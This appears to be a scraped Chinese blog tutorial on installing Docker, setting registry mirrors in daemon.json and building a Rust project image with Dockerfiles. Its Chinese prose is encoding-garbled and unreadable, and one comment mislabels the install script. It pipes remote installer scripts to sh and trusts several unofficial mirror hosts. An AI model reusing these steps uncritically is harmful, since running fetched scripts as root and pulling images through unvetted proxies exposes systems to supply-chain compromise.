pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">dockerå®‰è£…ä»¥åŠéƒ¨ç½²nodeé¡¹ç›®</h2>
<p>æºç åœ°å€</p>
<p>åŒè·¯ä¹‹äººï¼Œå¹¸å¾—å›é¡¾ï¼Œç›¼å¾—å›ä¹‹ä¸€èµï¼</p>
<p>ä¸å›åŒè¡Œï¼Œæ„¿å¾—é’çœ¼ç›¸åŠ ï¼</p>
<p>ä½ çš„star</p>
<p>å¦‚æ˜¥é£åŒ–é›¨ï¼Œæ¶¦ç‰©æ— å£°ï¼›</p>
<p>å¦‚å±±é—´æ¸…æ³‰ï¼Œæ»‹æ¶¦å¿ƒç”°ï¼›</p>
<p>å¦‚é•¿æ²³è½æ—¥ï¼Œæ˜ ç…§åˆå¿ƒï¼›</p>
<p>äº¦å¦‚æš—å¤œæ˜ç¯ï¼Œç…§äº®å‰è·¯ï¼›</p>
<p>æ˜¯å¾è¾ˆå‰è¡Œä¹‹æ˜ç¯ï¼Œäº¦æ˜¯æˆ‘åšæŒçš„åŠ¨åŠ›!</p>
<p>æ„¿å›å‰ç¨‹ä¼¼é”¦ï¼Œä»£ç å¦‚è¯—ï¼Œäººç”Ÿå¦‚ç”»ï¼</p>
<p>ã€GIthubåœ°å€ã€‘ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Flintaibai%2FTG" target="_blank" title="https://gitee.com/lintaibai/TG" ref="nofollow noopener noreferrer">github.com/lintaibai/Tâ€¦</a>ï¼‰</p>
<p>ã€Giteeåœ°å€ã€‘ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Flintaibai%2FTG" target="_blank" title="https://gitee.com/lintaibai/TG" ref="nofollow noopener noreferrer">gitee.com/lintaibai/Tâ€¦</a>ï¼‰</p>
<h3 data-id="heading-1">1ã€è®¤è¯†</h3>
<h4 data-id="heading-2">ä¸‹è½½åœ°å€</h4>
<p>æ³¨æ„æˆ‘ä»¬ä¸€èˆ¬é‡‡å–<code>Docker Desktop</code>è¿›è¡Œç®¡ç†ï¼Œå°±ç›¸å½“äºæˆ‘ä»¬çš„ç‰ˆæœ¬æˆ–è€…é•œåƒç»¼åˆçš„ä¸€ä¸ªç®¡ç†å·¥å…·</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®˜æ–¹ç½‘å€</span>
<span class="hljs-attr">https</span>:<span class="hljs-comment">//docs.docker.com/get-started/introduction/get-docker-desktop/</span>

<span class="hljs-comment">// æŸ¥çœ‹ç‰ˆæœ¬</span>
docker --version
<span class="hljs-title class_">Docker</span> version <span class="hljs-number">28.5</span><span class="hljs-number">.2</span>, build ecc6942


<span class="hljs-comment">// å›½å†…é˜¿é‡Œé•œåƒåœ°å€</span>
<span class="hljs-attr">https</span>:<span class="hljs-comment">//developer.aliyun.com/mirror/</span>
</code></pre>
<h4 data-id="heading-3">dockerå¸¸ç”¨å‘½ä»¤</h4>
<pre><code class="hljs language-javascript" lang="javascript"># åˆ—å‡ºæ‰€æœ‰æœ¬åœ°é•œåƒ
docker images

# æˆ–è€…ä½¿ç”¨æ›´è¯¦ç»†çš„æ ¼å¼
docker image ls

<span class="hljs-comment">// åˆ é™¤é•œåƒ</span>
# é€šè¿‡é•œåƒ<span class="hljs-variable constant_">ID</span>åˆ é™¤
docker rmi &lt;image_id&gt;

# é€šè¿‡é•œåƒååˆ é™¤
docker rmi &lt;image_name&gt;:&lt;tag&gt;

# ç¤ºä¾‹
docker rmi <span class="hljs-attr">ubuntu</span>:<span class="hljs-number">20.04</span>

# åˆ é™¤å¤šä¸ªæŒ‡å®šé•œåƒ
docker rmi &lt;image1&gt; &lt;image2&gt; &lt;image3&gt;
</code></pre>
<h4 data-id="heading-4">ä»‹ç»</h4>
<p>Docker æ˜¯ä¸€ä¸ªå¼€æºçš„å®¹å™¨åŒ–å¹³å°ï¼Œå®ƒå¯ä»¥å°†åº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–é¡¹æ‰“åŒ…åˆ°ä¸€ä¸ªè½»é‡çº§ã€å¯ç§»æ¤çš„å®¹å™¨ä¸­ã€‚ç®€å•æ¥è¯´ï¼ŒDocker è®©ä½ èƒ½å¤Ÿå°†ä½ çš„åº”ç”¨å’Œè¿è¡Œç¯å¢ƒæ‰“åŒ…åœ¨ä¸€èµ·ï¼Œç¡®ä¿åœ¨ä»»ä½•åœ°æ–¹éƒ½èƒ½ä»¥ç›¸åŒçš„æ–¹å¼è¿è¡Œã€‚</p>
<p>Docker å·²ç»æˆä¸ºç°ä»£è½¯ä»¶å¼€å‘å’Œéƒ¨ç½²çš„é‡è¦å·¥å…·ï¼Œç‰¹åˆ«æ˜¯åœ¨å¾®æœåŠ¡æ¶æ„å’Œ DevOps å®è·µä¸­ã€‚</p>
<h5 data-id="heading-5">ä¸»è¦ç‰¹ç‚¹å’Œä¼˜åŠ¿</h5>
<ol>
<li><strong>è½»é‡çº§</strong>ï¼šå®¹å™¨å…±äº«ä¸»æœºæ“ä½œç³»ç»Ÿçš„å†…æ ¸ï¼Œä¸éœ€è¦åƒè™šæ‹Ÿæœºé‚£æ ·è¿è¡Œå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼Œå› æ­¤æ›´åŠ è½»é‡ã€‚</li>
<li><strong>å¯ç§»æ¤æ€§</strong>ï¼šå®¹å™¨å¯ä»¥åœ¨ä»»ä½•æ”¯æŒ Docker çš„ç¯å¢ƒä¸­è¿è¡Œï¼ŒåŒ…æ‹¬å¼€å‘è€…çš„ç¬”è®°æœ¬ç”µè„‘ã€æµ‹è¯•æœåŠ¡å™¨ã€ç”Ÿäº§ç¯å¢ƒç­‰ã€‚</li>
<li><strong>ä¸€è‡´æ€§</strong>ï¼šç¡®ä¿åº”ç”¨åœ¨å¼€å‘ã€æµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒä¸­è¡¨ç°ä¸€è‡´ï¼Œæ¶ˆé™¤"åœ¨æˆ‘ç”µè„‘ä¸Šèƒ½è¿è¡Œ"çš„é—®é¢˜ã€‚</li>
<li><strong>å¿«é€Ÿéƒ¨ç½²</strong>ï¼šå®¹å™¨çš„å¯åŠ¨é€Ÿåº¦éå¸¸å¿«ï¼Œé€šå¸¸åªéœ€å‡ ç§’é’Ÿã€‚</li>
<li><strong>èµ„æºæ•ˆç‡é«˜</strong>ï¼šä¸è™šæ‹Ÿæœºç›¸æ¯”ï¼Œå®¹å™¨å ç”¨çš„èµ„æºæ›´å°‘ï¼Œå¯ä»¥åœ¨åŒä¸€å°æœºå™¨ä¸Šè¿è¡Œæ›´å¤šå®¹å™¨ã€‚</li>
<li><strong>ç‰ˆæœ¬æ§åˆ¶</strong>ï¼šDocker é•œåƒå¯ä»¥åƒä»£ç ä¸€æ ·è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œä¾¿äºè¿½è¸ªå’Œç®¡ç†å˜æ›´ã€‚</li>
</ol>
<h5 data-id="heading-6">Docker çš„åŸºæœ¬æ¦‚å¿µ</h5>
<ul>
<li><strong>é•œåƒ(Image)</strong>ï¼šä¸€ä¸ªåªè¯»çš„æ¨¡æ¿ï¼Œç”¨äºåˆ›å»ºå®¹å™¨ã€‚</li>
<li><strong>å®¹å™¨(Container)</strong>ï¼šé•œåƒçš„è¿è¡Œå®ä¾‹ï¼Œæ˜¯è½»é‡çº§ã€å¯æ‰§è¡Œçš„ç‹¬ç«‹è½¯ä»¶åŒ…ã€‚</li>
<li><strong>ä»“åº“(Repository)</strong>ï¼šç”¨äºå­˜å‚¨å’Œåˆ†å‘é•œåƒçš„åœ°æ–¹ï¼Œå¦‚ Docker Hub</li>
</ul>
<h4 data-id="heading-7">ç›¸å…³é•œåƒæº</h4>
<h5 data-id="heading-8">dockerå›½å†…çš„å¸¸è§é•œåƒæº</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">DaoCloud</span> é•œåƒç«™ï¼š<span class="hljs-attr">https</span>:<span class="hljs-comment">//docker.m.daocloud.io</span>
ç½‘æ˜“äº‘ï¼š<span class="hljs-attr">https</span>:<span class="hljs-comment">//hub-mirror.c.163.com</span>
ç™¾åº¦äº‘ï¼š<span class="hljs-attr">https</span>:<span class="hljs-comment">//mirror.baidubce.com</span>
å—äº¬å¤§å­¦é•œåƒç«™ï¼š<span class="hljs-attr">https</span>:<span class="hljs-comment">//docker.nju.edu.cn</span>
</code></pre>
<h5 data-id="heading-9">è®¾ç½®é•œåƒæº</h5>
<pre><code class="hljs language-javascript" lang="javascript">sudo mkdir -p /etc/docker

sudo tee /etc/docker/daemon.<span class="hljs-property">json</span> &lt;&lt;-<span class="hljs-string">'EOF'</span>
{
    <span class="hljs-string">"registry-mirrors"</span>: [
        <span class="hljs-string">"https://docker.m.daocloud.io"</span>,
        <span class="hljs-string">"https://hub-mirror.c.163.com"</span>,
        <span class="hljs-string">"https://mirror.baidubce.com"</span>,
        <span class="hljs-string">"https://docker.nju.edu.cn"</span>
    ]
}
<span class="hljs-variable constant_">EOF</span>

<span class="hljs-comment">// é‡å¯dockeræœåŠ¡</span>
sudo systemctl daemon-reload
sudo systemctl restart docker
</code></pre>
<h5 data-id="heading-10">é•œåƒæºä¿¡æ¯æŸ¥çœ‹</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æŸ¥çœ‹å½“å‰ç”Ÿæ•ˆçš„é•œåƒæº</span>

# æŸ¥çœ‹<span class="hljs-title class_">Docker</span>ä¿¡æ¯
docker info

# åœ¨è¾“å‡ºä¸­æŸ¥æ‰¾<span class="hljs-title class_">Registry</span> <span class="hljs-title class_">Mirrors</span>éƒ¨åˆ†



<span class="hljs-comment">// æŸ¥çœ‹è®¾ç½®çš„é•œåƒæº</span>
cat /etc/docker/daemon.<span class="hljs-property">json</span>

<span class="hljs-comment">// æŸ¥çœ‹é•œåƒæº</span>
docker info | grep -i <span class="hljs-string">"Registry Mirrors"</span> -A <span class="hljs-number">5</span>
</code></pre>
<h4 data-id="heading-11">å®Œæ•´çš„é•œåƒæºåŠåœ°å€</h4>
<pre><code class="hljs language-javascript" lang="javascript"> <span class="hljs-string">"registry-mirrors"</span>: [
    <span class="hljs-string">"https://mirrors.tuna.tsinghua.edu.cn/docker-ce"</span>, <span class="hljs-comment">// æ¸…åå¤§å­¦é•œåƒç«™</span>
    <span class="hljs-string">"https://docker.m.daocloud.io"</span>,  <span class="hljs-comment">// DaoCloud é•œåƒç«™</span>
    <span class="hljs-string">"https://hub-mirror.c.163.com"</span>,  <span class="hljs-comment">// ç½‘æ˜“äº‘</span>
    <span class="hljs-string">"https://mirror.baidubce.com"</span>,   <span class="hljs-comment">// ç™¾åº¦äº‘ </span>
    <span class="hljs-string">"https://docker.nju.edu.cn"</span>  <span class="hljs-comment">// å—äº¬å¤§å­¦é•œåƒç«™</span>
   
]


</code></pre>
<h3 data-id="heading-12">2ã€å®‰è£…ä½¿ç”¨</h3>
<h4 data-id="heading-13">Macä¸Šå®‰è£…Docker</h4>
<p>1ã€ä¸‹è½½åœ°å€</p>
<p>é€‰æ‹©è‡ªå·±å¯¹åº”çš„ç‰ˆæœ¬ä¸‹è½½å³å¯</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">https</span>:<span class="hljs-comment">//www.docker.com/products/docker-desktop/</span>
</code></pre>
<h4 data-id="heading-14">æ±‰åŒ–Docker Desktop</h4>
<p>Docker Desktop æ˜¯ä¸€ä¸ªè®©å¼€å‘è€…èƒ½å¤Ÿåœ¨ Windows å’Œ macOS ä¸Šè½»æ¾ä½¿ç”¨ Docker çš„åº”ç”¨ç¨‹åºã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript">ä¸‹è½½å¯¹åº”<span class="hljs-title class_">Docker</span> <span class="hljs-title class_">Desktop</span>ç‰ˆæœ¬å·ã€æ“ä½œç³»ç»Ÿçš„æ±‰åŒ–åŒ…
</code></pre>
<h4 data-id="heading-15">æœåŠ¡å™¨å®‰è£…Docker</h4>
<p>è¿›å…¥æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œæˆ‘çš„æ¼”ç¤ºä¸º<code>ubuntu</code>æœåŠ¡å™¨</p>
<p>ä»¥linuxç³»ç»Ÿçš„ä¸»æœºä¸ºæœ€ä½³</p>
<pre><code class="hljs language-javascript" lang="javascript">ä¸‹è½½å®‰è£…çš„å®˜ç½‘
<span class="hljs-attr">https</span>:<span class="hljs-comment">//get.docker.com/</span>

ç¬¬ä¸€ä¸ªå’Œç¬¬å››ä¸ªå‘½ä»¤

<span class="hljs-comment">// æ·»åŠ Dockerå®˜æ–¹GPGå¯†é’¥</span>
curl -fsSL <span class="hljs-attr">https</span>:<span class="hljs-comment">//get.docker.com -o install-docker.sh</span>
sudo sh install-docker.<span class="hljs-property">sh</span>

<span class="hljs-comment">// ç³»ç»Ÿå»ºè®®å®‰è£…å‘½ä»¤</span>
sudo apt install docker.<span class="hljs-property">io</span>

<span class="hljs-comment">// éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ</span>
docker --version
</code></pre>
<h3 data-id="heading-16">3ã€ä½¿ç”¨</h3>
<h4 data-id="heading-17">DockerFileæ–‡ä»¶é…ç½®</h4>
<p>Dockeræ‰“åŒ…é¡¹ç›®ä¸€èˆ¬éƒ½è¦æ–°å»ºDockerFileæ–‡ä»¶ï¼Œä»¥rustä¸ºä¾‹ï¼Œå†…å®¹å¦‚ä¸‹</p>
<pre><code class="hljs language-javascript" lang="javascript"># æ„å»ºé˜¶æ®µ
<span class="hljs-variable constant_">FROM</span> <span class="hljs-attr">rust</span>:<span class="hljs-number">1.70</span> <span class="hljs-keyword">as</span> builder
<span class="hljs-variable constant_">WORKDIR</span> /app
# ä¼˜åŒ–ç¼–è¯‘
<span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">RUSTFLAGS</span>=<span class="hljs-string">"-C target-feature=+crt-static"</span>
<span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">CARGO_TERM_COLOR</span>=always
<span class="hljs-variable constant_">COPY</span> <span class="hljs-title class_">Cargo</span>.<span class="hljs-property">toml</span> ./
<span class="hljs-variable constant_">RUN</span> mkdir src &amp;&amp; echo <span class="hljs-string">"fn main() {}"</span> &gt; src/main.<span class="hljs-property">rs</span> &amp;&amp; cargo build --release
<span class="hljs-variable constant_">RUN</span> rm -rf src
<span class="hljs-variable constant_">COPY</span> src ./src
<span class="hljs-variable constant_">RUN</span> cargo build --release

# è¿è¡Œé˜¶æ®µ
<span class="hljs-variable constant_">FROM</span> scratch
# ä»æ„å»ºé˜¶æ®µå¤åˆ¶ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œ<span class="hljs-variable constant_">SSL</span>è¯ä¹¦ï¼ˆå¦‚æœéœ€è¦<span class="hljs-variable constant_">HTTPS</span>ï¼‰
<span class="hljs-variable constant_">COPY</span> --<span class="hljs-keyword">from</span>=builder /app/target/release/nexus-rust-api /nexus-rust-api
<span class="hljs-variable constant_">COPY</span> --<span class="hljs-keyword">from</span>=builder /etc/ssl/certs/ca-certificates.<span class="hljs-property">crt</span> /etc/ssl/certs/
<span class="hljs-variable constant_">EXPOSE</span> <span class="hljs-number">3300</span>
<span class="hljs-variable constant_">CMD</span> [<span class="hljs-string">"/nexus-rust-api"</span>]

</code></pre>
<h4 data-id="heading-18">æ·»åŠ æƒé™</h4>
<p>å°†ç”¨æˆ·æ·»åŠ åˆ°dockerç»„</p>
<pre><code class="hljs language-plain" lang="plain">sudo usermod -aG docker $USER
# ç„¶åé‡æ–°ç™»å½•æˆ–æ‰§è¡Œï¼š
newgrp docker
</code></pre>
<h4 data-id="heading-19">æ‰“åŒ…æ„å»º</h4>
<pre><code class="hljs language-javascript" lang="javascript"># æ„å»ºé•œåƒ
docker build -t nexus-rust-api .

æ²¡æœ‰å°†ç”¨æˆ·æ·»åŠ åˆ°ç”¨æˆ·ç»„å¯ä»¥ç”¨è¿™ä¸ªå‘½ä»¤æ„å»ºé•œåƒ
sudo docker build -t nexus-rust-api .

# è¿è¡Œå®¹å™¨
docker run -p <span class="hljs-number">3300</span>:<span class="hljs-number">3300</span> nexus-rust-api

</code></pre>
<p>æ‰“åŒ…è¿‡ç¨‹ä¸€ç›´å¤±è´¥ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å›½å†…é•œåƒè¿›è¡ŒåŠ é€Ÿ</p>
<pre><code class="hljs language-javascript" lang="javascript">å›½å†…é•œåƒåŠ é€Ÿ

# åˆ›å»ºæˆ–ç¼–è¾‘daemon.<span class="hljs-property">json</span>

sudo mkdir -p /etc/docker

sudo tee /etc/docker/daemon.<span class="hljs-property">json</span> &lt;&lt;-<span class="hljs-string">'EOF'</span>
{
  <span class="hljs-string">"registry-mirrors"</span>: [
    <span class="hljs-string">"https://docker.mirrors.ustc.edu.cn"</span>,
    <span class="hljs-string">"https://hub-mirror.c.163.com"</span>
  ]
}
<span class="hljs-variable constant_">EOF</span>

<span class="hljs-comment">// ä»¥ä¸‹å‘½ä»¤éªŒè¯é…ç½®æ˜¯å¦ç”Ÿæ•ˆï¼šå‡ºç°åˆšåˆšçš„é•œåƒæºå°±æ˜¯æˆåŠŸäº†</span>
docker info | grep -A <span class="hljs-number">10</span> <span class="hljs-string">"Registry Mirrors"</span>

<span class="hljs-comment">// é…ç½®é˜¿é‡Œå®˜æ–¹é•œåƒåº“</span>
sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.<span class="hljs-property">json</span> &lt;&lt;-<span class="hljs-string">'EOF'</span>
{
  <span class="hljs-string">"registry-mirrors"</span>: [<span class="hljs-string">"https://registry.cn-hangzhou.aliyuncs.com"</span>]
}
<span class="hljs-variable constant_">EOF</span>

# é‡å¯<span class="hljs-title class_">Docker</span>æœåŠ¡
sudo systemctl daemon-reload
sudo systemctl restart docker

</code></pre>
<p>Dockerå›½å†…é•œåƒåœ°å€</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">https</span>:<span class="hljs-comment">//www.cnblogs.com/wzzkaifa/p/19041828</span>

# åœæ­¢<span class="hljs-title class_">Docker</span>æœåŠ¡
sudo systemctl stop docker

# é…ç½®æ–°çš„é•œåƒæº
sudo tee /etc/docker/daemon.<span class="hljs-property">json</span> &lt;&lt;-<span class="hljs-string">'EOF'</span>
{
  <span class="hljs-string">"registry-mirrors"</span>: [<span class="hljs-string">"https://docker.1ms.run"</span>]
}
<span class="hljs-variable constant_">EOF</span>

# é‡å¯<span class="hljs-title class_">Docker</span>æœåŠ¡
sudo systemctl daemon-reload
sudo systemctl start docker

# éªŒè¯é…ç½®
docker info | grep -A <span class="hljs-number">10</span> <span class="hljs-string">"Registry Mirrors"</span>


<span class="hljs-comment">// DockerFileæ–‡ä»¶é…ç½®</span>

# æ„å»ºé˜¶æ®µ
<span class="hljs-variable constant_">FROM</span> docker.1ms.<span class="hljs-property">run</span>/library/<span class="hljs-attr">rust</span>:<span class="hljs-number">1.70</span> <span class="hljs-keyword">as</span> builder
<span class="hljs-variable constant_">WORKDIR</span> /app
<span class="hljs-variable constant_">COPY</span> <span class="hljs-title class_">Cargo</span>.<span class="hljs-property">toml</span> ./
<span class="hljs-variable constant_">RUN</span> mkdir src &amp;&amp; echo <span class="hljs-string">"fn main() {}"</span> &gt; src/main.<span class="hljs-property">rs</span> &amp;&amp; cargo build --release
<span class="hljs-variable constant_">RUN</span> rm -rf src
<span class="hljs-variable constant_">COPY</span> src ./src
<span class="hljs-variable constant_">RUN</span> cargo build --release

# è¿è¡Œé˜¶æ®µ
<span class="hljs-variable constant_">FROM</span> scratch
<span class="hljs-variable constant_">COPY</span> --<span class="hljs-keyword">from</span>=builder /app/target/release/nexus-rust-api /nexus-rust-api
<span class="hljs-variable constant_">EXPOSE</span> <span class="hljs-number">3300</span>
<span class="hljs-variable constant_">CMD</span> [<span class="hljs-string">"/nexus-rust-api"</span>]

docker build -t nexus-rust-api .

<span class="hljs-variable constant_">FROM</span> <span class="hljs-attr">rust</span>:<span class="hljs-number">1.75</span>
<span class="hljs-variable constant_">WORKDIR</span> /app
<span class="hljs-variable constant_">COPY</span> . .
<span class="hljs-variable constant_">RUN</span> cargo build --release
<span class="hljs-variable constant_">CMD</span> [<span class="hljs-string">"./target/release/nexus-rust-api"</span>]
</code></pre>
<h4 data-id="heading-20">é…ç½®ä¿¡æ¯</h4>
<p>æœ¬åœ°æˆ‘çš„é…ç½®</p>
<pre><code class="hljs language-javascript" lang="javascript">sudo mkdir -p /etc/docker

<span class="hljs-comment">//  æ¸…åå¤§å­¦</span>
<span class="hljs-string">"https://mirrors.tuna.tsinghua.edu.cn/docker-ce"</span>


sudo tee /etc/docker/daemon.<span class="hljs-property">json</span> &lt;&lt;-<span class="hljs-string">'EOF'</span>
{
  <span class="hljs-string">"registry-mirrors"</span>: [
    <span class="hljs-string">"https://mirrors.tuna.tsinghua.edu.cn/docker-ce"</span>,
    <span class="hljs-string">"https://ccr.ccs.tencentyun.com"</span>,
    <span class="hljs-string">"https://docker.1ms.run"</span>,
    <span class="hljs-string">"https://hub-mirror.c.163.com"</span>,
    <span class="hljs-string">"https://mirror.baidubce.com"</span>,
    <span class="hljs-string">"https://do.nark.eu.org"</span>,
    <span class="hljs-string">"https://dc.j8.work"</span>,
    <span class="hljs-string">"https://docker.m.daocloud.io"</span>,
    <span class="hljs-string">"https://dockerproxy.com"</span>,
    <span class="hljs-string">"https://docker.mirrors.ustc.edu.cn"</span>,
    <span class="hljs-string">"https://docker.nju.edu.cn"</span>,
    <span class="hljs-string">"https://docker.1panel.live"</span>,
    <span class="hljs-string">"https://docker.1panelproxy.com"</span>,
    <span class="hljs-string">"https://elastic.m.daocloud.io"</span>,
    <span class="hljs-string">"https://elastic.m.daocloud.io"</span>,
    <span class="hljs-string">"https://docker.m.daocloud.io"</span>,
    <span class="hljs-string">"https://gcr.m.daocloud.io"</span>,
    <span class="hljs-string">"https://ghcr.m.daocloud.io"</span>,
    <span class="hljs-string">"https://k8s-gcr.m.daocloud.io"</span>,
    <span class="hljs-string">"https://k8s.m.daocloud.io"</span>,
    <span class="hljs-string">"https://mcr.m.daocloud.io"</span>,
    <span class="hljs-string">"https://nvcr.m.daocloud.io"</span>,
    <span class="hljs-string">"https://quay.m.daocloud.io"</span>
  ]
}
<span class="hljs-variable constant_">EOF</span>
</code></pre>
<h4 data-id="heading-21">å€Ÿé‰´é…ç½®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/rust-cross/rust-musl-cross.git</span>


<span class="hljs-variable constant_">FROM</span> <span class="hljs-attr">ubuntu</span>:<span class="hljs-number">22.04</span>

<span class="hljs-variable constant_">ENV</span> <span class="hljs-variable constant_">DEBIAN_FRONTEND</span>=noninteractive

# <span class="hljs-title class_">Make</span> sure we have basic dev tools <span class="hljs-keyword">for</span> building C libraries.  <span class="hljs-title class_">Our</span> goal
# here is to support the musl-libc builds and <span class="hljs-title class_">Cargo</span> builds needed <span class="hljs-keyword">for</span> a
# large selection <span class="hljs-keyword">of</span> the most popular crates.
#
<span class="hljs-variable constant_">RUN</span> apt-get update &amp;&amp; \
    apt-get install -y \
    build-essential \
    cmake \
    curl \
    file \
    git \
    sudo \
    xutils-dev \
    unzip \
    ca-certificates \
    python3 \
    python3-pip \
    autoconf \
    autoconf-archive \
    automake \
    flex \
    bison \
    llvm-dev \
    libclang-dev \
    clang \
    &amp;&amp; \
    apt-get clean &amp;&amp; rm -rf /<span class="hljs-keyword">var</span>/lib/apt/lists<span class="hljs-comment">/*

# Install Let's Encrypt R3 CA certificate from https://letsencrypt.org/certificates/
COPY lets-encrypt-r3.crt /usr/local/share/ca-certificates
RUN update-ca-certificates

ARG TARGET=x86_64-unknown-linux-musl
ARG MUSL_TARGET=$TARGET
ENV RUST_MUSL_CROSS_TARGET=$MUSL_TARGET
ARG RUST_MUSL_MAKE_CONFIG=config.mak

COPY $RUST_MUSL_MAKE_CONFIG /tmp/config.mak

RUN cd /tmp &amp;&amp; \
    git clone --depth 1 https://github.com/richfelker/musl-cross-make.git &amp;&amp; \
    cp /tmp/config.mak /tmp/musl-cross-make/config.mak &amp;&amp; \
    cd /tmp/musl-cross-make &amp;&amp; \
    export CFLAGS="-fPIC -g1 $CFLAGS" &amp;&amp; \
    export TARGET=$MUSL_TARGET &amp;&amp; \
    if [ `dpkg --print-architecture` = 'armhf' ] &amp;&amp; [ `uname -m` = 'aarch64' ]; then SETARCH=linux32; else SETARCH= ; fi &amp;&amp; \
    $SETARCH make -j$(nproc) &gt; /tmp/musl-cross-make.log &amp;&amp; \
    $SETARCH make install &gt;&gt; /tmp/musl-cross-make.log &amp;&amp; \
    ln -s /usr/local/musl/bin/$TARGET-strip /usr/local/musl/bin/musl-strip &amp;&amp; \
    cd /tmp &amp;&amp; \
    rm -rf /tmp/musl-cross-make /tmp/musl-cross-make.log

RUN mkdir -p /home/rust/libs /home/rust/src

# Set up our path with all our binary directories, including those for the
# musl-gcc toolchain and for our Rust toolchain.
ENV PATH=/root/.cargo/bin:/usr/local/musl/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ENV TARGET_CC=$MUSL_TARGET-gcc
ENV TARGET_CXX=$MUSL_TARGET-g++
ENV TARGET_AR=$MUSL_TARGET-ar
ENV TARGET_RANLIB=$MUSL_TARGET-ranlib
ENV TARGET_HOME=/usr/local/musl/$MUSL_TARGET
ENV TARGET_C_INCLUDE_PATH=$TARGET_HOME/include/

# pkg-config cross compilation support
ENV TARGET_PKG_CONFIG_ALLOW_CROSS=1
ENV TARGET_PKG_CONFIG_SYSROOT_DIR=$TARGET_HOME
ENV TARGET_PKG_CONFIG_PATH=$TARGET_HOME/lib/pkgconfig:/usr/local/musl/lib/pkgconfig
ENV TARGET_PKG_CONFIG_LIBDIR=$TARGET_PKG_CONFIG_PATH

# We'll build our libraries in subdirectories of /home/rust/libs.  Please
# clean up when you're done.
WORKDIR /home/rust/libs

RUN export CC=$TARGET_CC &amp;&amp; \
    export C_INCLUDE_PATH=$TARGET_C_INCLUDE_PATH &amp;&amp; \
    export AR=$TARGET_AR &amp;&amp; \
    export RANLIB=$TARGET_RANLIB &amp;&amp; \
    echo "Building zlib" &amp;&amp; \
    VERS=1.2.13 &amp;&amp; \
    CHECKSUM=b3a24de97a8fdbc835b9833169501030b8977031bcb54b3b3ac13740f846ab30 &amp;&amp; \
    cd /home/rust/libs &amp;&amp; \
    curl -sqLO https://zlib.net/fossils/zlib-$VERS.tar.gz &amp;&amp; \
    echo "$CHECKSUM zlib-$VERS.tar.gz" &gt; checksums.txt &amp;&amp; \
    sha256sum -c checksums.txt &amp;&amp; \
    tar xzf zlib-$VERS.tar.gz &amp;&amp; cd zlib-$VERS &amp;&amp; \
    CFLAGS="-O3 -fPIC" ./configure --static --prefix=$TARGET_HOME &amp;&amp; \
    make -j$(nproc) &amp;&amp; make install &amp;&amp; \
    cd .. &amp;&amp; rm -rf zlib-$VERS.tar.gz zlib-$VERS checksums.txt

# The Rust toolchain to use when building our image
ARG TOOLCHAIN=stable
# Install our Rust toolchain and the `musl` target.  We patch the
# command-line we pass to the installer so that it won't attempt to
# interact with the user or fool around with TTYs.  We also set the default
# `--target` to musl so that our users don't need to keep overriding it
# manually.
# Chmod 755 is set for root directory to allow access execute binaries in /root/.cargo/bin (azure piplines create own user).
#
# Remove docs and more stuff not needed in this images to make them smaller
RUN chmod 755 /root/ &amp;&amp; \
    if [ `dpkg --print-architecture` = 'armhf' ]; then GNU_TARGET="armv7-unknown-linux-gnueabihf"; else GNU_TARGET=`uname -m`-unknown-linux-gnu; fi &amp;&amp; \
    export RUSTUP_USE_CURL=1 &amp;&amp; \
    curl https://sh.rustup.rs -sqSf | \
    sh -s -- -y --profile minimal --default-toolchain $TOOLCHAIN --default-host $GNU_TARGET &amp;&amp; \
    rustup target add $TARGET || rustup component add --toolchain $TOOLCHAIN rust-src &amp;&amp; \
    rustup component add --toolchain $TOOLCHAIN rustfmt clippy &amp;&amp; \
    rm -rf /root/.rustup/toolchains/$TOOLCHAIN-$GNU_TARGET/share/

RUN echo "[target.$TARGET]\nlinker = \"$TARGET_CC\"\n" &gt; /root/.cargo/config.toml

# Build std sysroot for targets that doesn't have official std release
ADD Xargo.toml /tmp/Xargo.toml
ADD s390x-unwind.patch /tmp/s390x-unwind.patch
ADD build-std.sh .
RUN bash build-std.sh

ENV RUSTUP_HOME=/root/.rustup
ENV CARGO_HOME=/root/.cargo
ENV CARGO_BUILD_TARGET=$TARGET

ENV CFLAGS_armv7_unknown_linux_musleabihf='-mfpu=vfpv3-d16'

# Build statically linked binaries for MIPS targets
